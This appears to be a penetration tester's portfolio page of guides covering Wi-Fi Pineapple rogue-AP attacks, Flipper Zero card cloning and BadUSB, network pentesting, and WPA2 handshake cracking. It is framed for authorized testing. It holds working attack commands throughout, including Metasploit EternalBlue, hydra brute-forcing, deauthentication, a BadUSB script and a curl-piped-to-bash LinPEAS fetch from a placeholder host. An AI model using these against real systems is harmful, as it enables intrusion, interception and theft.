Hak5 Wi-Fi Pineapple Mark VII

The Wi-Fi Pineapple is a wireless auditing platform designed for penetration testers to conduct rogue AP attacks, capture WPA handshakes, perform man-in-the-middle attacks, and assess wireless network security — all from a purpose-built, field-deployable device running the PineAP suite.

wireless-auditing rogue-AP MITM Hak5 PineAP
[ ▼ click for setup guide & use cases ]
The Wi-Fi Pineapple is intended for authorized wireless security audits only. Deploying rogue access points or intercepting traffic on networks without explicit written permission is illegal. Always operate within the scope of your engagement.

1 Hardware Overview

The Mark VII is built on a modified OpenWRT platform with dual radios — one dedicated to management and one for attacks. It operates on 2.4 GHz and supports monitor mode, packet injection, and client deauthentication natively. The Enterprise variant adds 5 GHz support and an RJ45 WAN port for larger engagements.

Key components: dual RP-SMA antenna connectors, USB-C port (power + Ethernet adapter), USB-A port for storage/expansion, and a status LED for quick state identification.

2 Initial Setup & Configuration

The Pineapple ships with a minimal "stager" firmware that downloads the latest full firmware during first boot. Here's the setup process:

# Step 1: Attach antennas to RP-SMA ports (don't overtighten)
# Step 2: Connect via USB-C to your laptop
# Step 3: The Pineapple appears as a USB Ethernet adapter
# Your machine will get a DHCP address in 172.16.42.0/24

# Verify connectivity
$ ping 172.16.42.1

# Open the web interface in your browser
$ firefox http://172.16.42.1:1471

# The setup wizard will prompt you to:
1. Verify physical access (press reset button)
2. Connect to a Wi-Fi network for firmware download
3. Wait 10-15 min for firmware flash
4. Set root password & management SSID
The USB-C connection is the most stable setup method. If using Wi-Fi instead, connect to the open network named "Pineapple_XXXX" (last 4 of MAC). Mac users may need to install ASIX AX88772C drivers manually.

3 SSH Access & CLI Management

For deeper configuration and scripting, SSH into the Pineapple directly:

# SSH into the Pineapple
$ ssh root@172.16.42.1

# Check running firmware version
root@pineapple:~# cat /etc/os-release

# View wireless interfaces
root@pineapple:~# iwconfig
wlan0 IEEE 802.11 Mode:Master (management radio)
wlan1 IEEE 802.11 Mode:Monitor (attack radio)

# Check connected clients
root@pineapple:~# iw dev wlan1 station dump

4 Core Attack Capabilities

The PineAP suite provides a streamlined workflow for wireless auditing. Here are the primary attack modes:

Recon & Scanning — Passively discover nearby access points, clients, and their probe requests. Map the wireless environment to identify targets and understand network relationships before any active attacks.

Rogue AP / Evil Twin — The Pineapple can impersonate trusted networks by responding to client probe requests. When a device probes for "CoffeeShop_WiFi", the Pineapple answers and the client connects automatically — routing all traffic through your device.

Deauthentication — Targeted deauth attacks force clients off their legitimate AP, pushing them toward your rogue AP. The Pineapple's filtering (MAC/SSID allow/deny lists) keeps the attack scoped to authorized targets only.

Handshake Capture — Capture WPA/WPA2 4-way handshakes for offline cracking. Captured PCAP files can be exported and cracked with Aircrack-ng or Hashcat on your workstation.

Man-in-the-Middle — Once clients connect to the rogue AP, you can intercept and analyze traffic — DNS spoofing, credential harvesting via Evil Portal, SSL stripping, and packet capture are all supported through built-in modules.

# Modules available through the web interface (Settings > Modules)

DNSspoof # Redirect DNS queries to attacker-controlled hosts

6 Engagement Tips

Always configure MAC and SSID filters before activating PineAP. This scopes your attack to only the authorized target network and prevents collateral impact on nearby networks — critical for professional engagements.
Power the Pineapple from a USB battery bank for field deployments. Use a USB-A power bank (not USB-C PD) to avoid power negotiation issues. Some USB-C PD chargers won't deliver the basic 5V the Pineapple needs.
For covert assessments, the Pineapple's small form factor lets you deploy it in a backpack or drop it in a ceiling tile. Pair with Hak5 Cloud C2 for remote management over the internet.

Flipper Zero — Multi-Tool for Physical Pentesting

A pocket-sized multi-tool for interacting with access control systems, RFID/NFC, sub-GHz radio protocols, infrared devices, and USB HID attacks. Think of it as a Swiss Army knife for physical security assessments — one device that replaces a bag full of specialized hardware.

RFID NFC sub-GHz infrared BadUSB physical-pentest
[ ▼ click for capabilities & use cases ]
The Flipper Zero is a security research and education tool. Using it to access systems, clone credentials, or replay signals without explicit authorization is illegal. Only use in authorized engagements, personal lab environments, or on devices you own.

1 What's Inside the Flipper

Despite its toy-like appearance, the Flipper Zero packs serious hardware. Here's what you're working with:

# Flipper Zero Hardware Capabilities

Sub-GHz Radio # TX/RX on 300-928 MHz (433, 315, 868, 915 MHz bands)
125 kHz RFID # Read, write, & emulate low-frequency proximity cards
NFC (13.56 MHz) # Read, write, & emulate NFC tags (MIFARE, NTAG, etc.)
Infrared # Transmit & receive IR signals (TV, AC, projectors)
USB-C (HID) # Emulate keyboard/mouse — BadUSB / Rubber Ducky scripts
GPIO Pins # Hardware hacking, UART, SPI, I2C debugging
Bluetooth LE # BLE communication (expandable w/ modules)
iButton # Read & emulate 1-Wire iButton keys
microSD Slot # Expandable storage up to 32GB for captures & scripts

2 Getting Started & Firmware

Out of the box, the Flipper runs official firmware from Flipper Devices. The first step is connecting it to the qFlipper desktop app or the Flipper mobile app to update firmware and manage files.

# Download qFlipper from flipperzero.one/update
# Connect Flipper via USB-C
# qFlipper auto-detects and updates firmware

# Firmware options:
Official # Stable, legal frequency limits, regular updates
Unleashed # Removes regional RF restrictions, extra protocols
Momentum # UI customization, BLE spam tools, advanced features
RogueMaster # Merges community features, extra apps & games

# Insert a microSD card (FAT32) for expanded storage
# The Flipper stores all saved signals, keys, and scripts on the SD card
For authorized pentesting, community firmware like Unleashed opens up extended sub-GHz frequency ranges and rolling code support that the official firmware restricts for legal compliance. Understand your local RF regulations before switching.

3 Use Case — RFID Access Card Cloning (125 kHz)

One of the most impactful physical pentest capabilities. Many office buildings, hotels, and secure facilities still use low-frequency proximity cards that the Flipper can read and emulate in seconds.

# On the Flipper:
Main Menu > 125 kHz RFID > Read

# Hold the Flipper within ~1 inch of the target card/fob
# The Flipper reads and identifies the card type:
Card type: EM4100
ID: 01:AB:CD:EF:23

# Save the card data with a descriptive name
Save > "lobby_badge_test"

# To emulate (replay) the saved card:
125 kHz RFID > Saved > lobby_badge_test > Emulate

# Hold the Flipper to the RFID reader — it transmits the cloned signal
Modern access control systems using rolling codes, MIFARE DESFire, or HID iCLASS SE with diversified keys are resistant to simple replay attacks. Always document which card technologies are vulnerable and recommend upgrades in your report.

4 Use Case — Sub-GHz Signal Capture & Replay

The Flipper can capture and replay radio signals used by garage doors, gate openers, wireless sensors, IoT devices, and some older key fobs operating on 300-928 MHz bands.

# On the Flipper:
Main Menu > Sub-GHz > Read

# Press the target device's button (e.g., garage remote)
# The Flipper captures the signal:
Protocol: Princeton
Frequency: 433.92 MHz
Key: 0x00ABC123

# Save and replay:
Save > "gate_test_signal"
Sub-GHz > Saved > gate_test_signal > Send

# For frequency analysis (find unknown signals):
Sub-GHz > Frequency Analyzer
# Shows real-time RF activity and identifies active frequencies
Static code systems (fixed key) are trivially replayable. Rolling code systems (like modern garage doors and car fobs) change the key with every transmission — the Flipper cannot crack these out of the box. This is a common myth. Document the difference in your findings.

5 Use Case — BadUSB / Rubber Ducky Attacks

The Flipper can emulate a USB keyboard when plugged into a target computer via USB-C. This lets you run pre-written Rubber Ducky scripts that execute commands at typing speed — useful for demonstrating physical access risks.

# BadUSB scripts are stored on the Flipper's SD card
# Location: /badusb/ on the microSD

# Example script: Open PowerShell and grab system info
DELAY 1000
GUI r # Win+R to open Run dialog
DELAY 500
STRING powershell # Type "powershell"
ENTER
DELAY 1000
STRING whoami; systeminfo; ipconfig /all
ENTER

# To deploy: plug Flipper into target machine
Main Menu > Bad USB > select script > Run
BadUSB attacks demonstrate why physical access control matters. If an attacker can plug a device into an unlocked workstation for 10 seconds, they can exfiltrate data, create backdoor accounts, or install persistence mechanisms. Recommend USB port lockdown policies and endpoint detection in your report.

6 Use Case — Infrared & NFC

Infrared: The Flipper has a built-in IR transmitter and receiver. It comes with a universal remote database covering thousands of TVs, projectors, AC units, and AV equipment. You can also capture and replay unknown IR signals. In pentesting, this is useful for demonstrating control over conference room projectors, digital signage, or smart office equipment during physical assessments.

NFC (13.56 MHz): The Flipper can read, save, and emulate NFC tags including MIFARE Classic, MIFARE Ultralight, and NTAG series. For access control systems using NFC badges, the workflow is similar to RFID — read the badge, save it, and emulate. Note that modern high-security NFC cards (DESFire EV2/EV3, SEOS) use encrypted authentication that the Flipper cannot bypass.

7 Expanding the Flipper

The GPIO header on top of the Flipper supports add-on modules that extend its capabilities significantly:

Video Game Module # Video output + extra processing power
Prototyping Board # Custom hardware hacking & circuit debugging
Third-party boards # Community-built: GPS, SDR, LoRa, extra antennas
The Flipper is open-source and community-driven. Check the official Flipper Zero GitHub and community forums for new apps, plugins, and firmware features. The ecosystem is constantly growing — frequency analyzers, protocol fuzzers, and BLE tools are all actively developed.

Network Penetration Testing: A Step-by-Step Methodology

A practical walkthrough of my network pentesting methodology — from initial reconnaissance and host discovery through enumeration, exploitation, and post-exploitation — with the exact commands I run at each phase.

penetration-testing nmap methodology walkthrough
[ ▼ click to expand full walkthrough ]
Always ensure you have explicit written authorization before performing any penetration testing. Unauthorized testing is illegal and unethical. This guide is for educational purposes and authorized engagements only.

1 Phase 1 — Host Discovery & Network Mapping

Before touching any individual host, you need to understand the terrain. The goal here is to identify live hosts on the target network, map out subnets, and get a high-level picture of what you're working with.

# Ping sweep to discover live hosts on the subnet
$ nmap -sn 192.168.1.0/24

# ARP scan (more reliable on local network, avoids ICMP filtering)
$ nmap -sn -PR 192.168.1.0/24

# If ICMP is blocked, try TCP SYN discovery on common ports
$ nmap -sn -PS22,80,443,445 192.168.1.0/24

# Export live hosts to a file for the next phases
$ nmap -sn 192.168.1.0/24 -oG discovery.gnmap
$ grep "Up" discovery.gnmap | awk '{print $2}' > live_hosts.txt
Start quiet. A ping sweep is low-noise. Save the heavy scanning for when you know what's alive — it reduces detection risk and saves time.

2 Phase 2 — Port Scanning & Service Enumeration

Now that you have live hosts, it's time to find open ports and identify what services are running. This is where you start building your attack surface map.

# Fast SYN scan on top 1000 ports across all live hosts
$ nmap -sS -T4 -iL live_hosts.txt -oN initial_scan.txt

# Full port scan (all 65535 ports) on high-value targets
$ nmap -sS -p- -T4 --min-rate 1000 192.168.1.10 -oN full_port.txt

# Service version detection + OS fingerprinting on open ports
$ nmap -sV -sC -O -p 22,80,135,139,445,3389 192.168.1.10 -oN enum_detail.txt

# UDP scan on common ports (often overlooked but critical)
$ nmap -sU --top-ports 50 192.168.1.10 -oN udp_scan.txt
Always run a UDP scan. Services like SNMP (161), TFTP (69), and DNS (53) are frequently exposed and misconfigured — they're easy wins that most testers overlook because UDP scanning is slow.

3 Phase 3 — Detailed Service Enumeration

With open ports and services identified, dig deeper into each service. The goal is to find version numbers, misconfigurations, default credentials, and known vulnerabilities.

# SMB enumeration — check for shares, users, null sessions
$ enum4linux -a 192.168.1.10
$ smbclient -L //192.168.1.10 -N
$ crackmapexec smb 192.168.1.10 --shares -u '' -p ''

# HTTP enumeration — directory brute-forcing & tech fingerprinting
$ gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -t 50
$ nikto -h http://192.168.1.10
$ whatweb http://192.168.1.10

# SNMP enumeration (if port 161 is open)
$ snmpwalk -v2c -c public 192.168.1.10

# Check for known vulnerabilities with Nmap scripts
$ nmap --script vuln -p 445 192.168.1.10

4 Phase 4 — Vulnerability Analysis & Exploitation

Cross-reference your enumeration findings with known CVEs and exploit databases. Prioritize based on impact and likelihood of success.

# Search for exploits based on service versions you found
$ searchsploit "Apache 2.4.49"
$ searchsploit "OpenSSH 7.2"

# Use Metasploit for known exploits
msf6 > search type:exploit name:eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.10
msf6 > run

# Manual password attacks on discovered services
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh -t 4
Always check for low-hanging fruit first: default credentials, anonymous FTP/SMB, unpatched services. You'd be surprised how often the simplest attack vector works in real engagements.

5 Phase 5 — Post-Exploitation & Privilege Escalation

Once you have initial access, the next objective is to escalate privileges, maintain access, and pivot deeper into the network.

# Linux privilege escalation — initial recon
$ whoami && id
$ uname -a
$ sudo -l
$ find / -perm -4000 -type f 2>/dev/null
$ cat /etc/crontab

# Automated enumeration with LinPEAS
$ curl http://YOUR_IP/linpeas.sh | bash

# Windows privilege escalation — initial recon
C:\> whoami /priv
C:\> systeminfo
C:\> net user
C:\> netstat -ano

6 Phase 6 — Documentation & Reporting

This is the phase that separates professionals from hobbyists. Every finding needs clear documentation: what you found, how you exploited it, proof of concept, impact assessment, and actionable remediation steps. I keep detailed terminal logs throughout the engagement and organize findings by severity.

Document as you go, not after. Use script or tmux logging to capture your terminal session. Recreating steps from memory after a 12-hour engagement is a recipe for missed details.

Wi-Fi Penetration Testing: WPA2 Assessment Walkthrough

My go-to methodology for wireless penetration testing — from adapter setup and monitor mode through network reconnaissance, handshake capture, and cracking — using the Aircrack-ng suite and supporting tools.

wireless-security aircrack-ng wifi-pentesting OSWP
[ ▼ click to expand full walkthrough ]
Wireless penetration testing must only be performed on networks you own or have explicit written authorization to test. Intercepting wireless traffic on unauthorized networks violates federal law (e.g., the Computer Fraud and Abuse Act). This guide is for authorized engagements and lab environments only.

1 Phase 1 — Adapter Setup & Monitor Mode

Everything starts with your wireless adapter. You need a card that supports monitor mode and packet injection. Once you've confirmed compatibility, kill any processes that might interfere and put the adapter into monitor mode.

# Check your wireless interfaces
$ iwconfig
$ airmon-ng

# Kill processes that could interfere with monitor mode
$ airmon-ng check kill

# Enable monitor mode on your adapter
$ airmon-ng start wlan0

# Verify monitor mode is active (should show wlan0mon)
$ iwconfig
wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.437 GHz
Popular chipsets for wireless pentesting: Atheros AR9271 (ALFA AWUS036NHA), Ralink RT3070 (ALFA AWUS036NH), and RTL8812AU for 5GHz support. Always verify packet injection works with aireplay-ng --test wlan0mon before starting.

2 Phase 2 — Wireless Reconnaissance

With monitor mode active, scan the airwaves to identify target networks, their encryption types, channels, connected clients, and signal strength. This is your wireless equivalent of the network discovery phase.

# Scan all nearby wireless networks
$ airodump-ng wlan0mon

# Example output:
BSSID PWR CH ENC CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF -42 6 WPA2 CCMP PSK TargetNetwork
11:22:33:44:55:66 -67 1 WPA2 CCMP PSK NeighborNet

# Lock onto the target network's channel and capture data
$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

Keep this running in a dedicated terminal. You're now listening for traffic on the target network's channel and writing captured packets to a file. Pay attention to the STATION section — those are connected clients you can target for deauthentication.

3 Phase 3 — Capturing the WPA2 Handshake

To crack WPA2-PSK, you need to capture the 4-way handshake that occurs when a client authenticates to the access point. You can either wait for a client to connect naturally, or force a reconnection with a deauthentication attack.

# Send deauth packets to force a client to reconnect
# (keep airodump-ng running in another terminal)
$ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c [CLIENT_MAC] wlan0mon

# -0 5 = send 5 deauth frames
# -a = target AP BSSID
# -c = target client MAC (optional, omit for broadcast deauth)

# Watch airodump-ng for the handshake confirmation:
[ WPA handshake: AA:BB:CC:DD:EE:FF ]

# Verify the captured handshake file
$ aircrack-ng capture-01.cap
1 handshake(s) detected
Only send the minimum number of deauth frames needed. Flooding the network with deauths is noisy, disruptive, and unnecessary. 3–5 frames is usually enough to force a reconnect. If no clients are connected, you'll have to wait for one to appear.

4 Phase 4 — Cracking the Handshake

With the handshake captured, you can now attempt to crack the pre-shared key offline. The two main approaches are dictionary attacks and rule-based attacks.

# Dictionary attack with Aircrack-ng
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# GPU-accelerated cracking with Hashcat (much faster)
# First, convert the cap file to hashcat format
$ hcxpcapngtool -o hash.hc22000 capture-01.cap

# Run Hashcat with rockyou wordlist
$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Rule-based attack for more coverage
$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Hashcat with GPU acceleration is orders of magnitude faster than Aircrack-ng's CPU-based cracking. On a modern GPU, you can test millions of WPA2 candidates per second versus thousands with CPU alone.

5 Phase 5 — Cleanup & Restore

Once the assessment is complete, always clean up your environment and restore the wireless adapter to its normal state.

# Stop monitor mode and restore managed mode
$ airmon-ng stop wlan0mon

# Restart network manager
$ systemctl start NetworkManager

# Verify adapter is back in managed mode
$ iwconfig
wlan0 IEEE 802.11 Mode:Managed Frequency:2.437 GHz

6 Phase 6 — Reporting & Recommendations

Document everything: the target ESSID, encryption type, whether the handshake was captured and cracked, time-to-crack, and the password complexity. Recommendations should cover enforcing strong passphrases (12+ characters, non-dictionary), migrating to WPA3 where supported, enabling 802.1X/RADIUS for enterprise environments, implementing wireless IDS to detect deauth floods, and disabling WPS.

If you successfully crack the key, handle it as sensitive data. Include it in your report under appropriate confidentiality controls and recommend immediate rotation.
